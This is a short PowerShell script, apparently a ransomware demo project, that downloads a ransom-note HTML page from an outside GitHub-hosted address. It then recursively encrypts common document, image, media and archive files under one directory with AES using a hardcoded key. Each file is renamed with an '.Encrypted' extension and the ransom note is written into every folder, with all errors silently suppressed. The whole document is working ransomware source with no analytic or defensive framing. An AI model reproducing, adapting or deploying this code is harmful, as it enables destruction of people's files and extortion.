$web = New-Object Net.WebClient
$key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvXIGeuwHQzt0XVyRBA9/bCK7j9b4celVVd5ATSr/6Ev6QiBagf+d11l71Eqhznddzgi5+hEB+j5VPJq+4EjdD7JLnVjd/kxd4xkCFjkWsjEY9Vh41kZDoB3F0z92zkwHIx/wVtJJdq6vUX1Q9TMSRjQrA+XpdotSU+2Q/lBP12QIDAQAB"
$text = $web.DownloadString("https://raw.githack.com/jaideepkathiresan/RansomwareNS/main/Ransomware.html")

function Encrypt-File($String, $Passphrase)
{
    $salt="I only need to press one key to run the exploit.";
    $init="Or, I can press another and disable the entire plan.";
    $r = new-Object System.Security.Cryptography.RijndaelManaged
    $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
    $salt = [Text.Encoding]::UTF8.GetBytes($salt)

    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
   
    $c = $r.CreateEncryptor()
    $ms = new-Object IO.MemoryStream
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$c,"Write"
    $sw = new-Object IO.StreamWriter $cs
    $sw.Write($String)
    $sw.Close()
    $cs.Close()
    $ms.Close()
    $r.Clear()
    return $ms.ToArray()
}

gci A:/RansomwareNS -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{

   try{
       $file = Get-Content $_ -raw;
       $encrypt = Encrypt-File $file $key
       Set-Content -Path $_ -Value $encrypt

        $newname=$_.Name+'.Encrypted';
        ren -Path $_.FullName -NewName $newname -Force;

        $path=$_.DirectoryName+'\Ransomware.html';
        sc -pat $path -va $text
    }
    catch{}
}
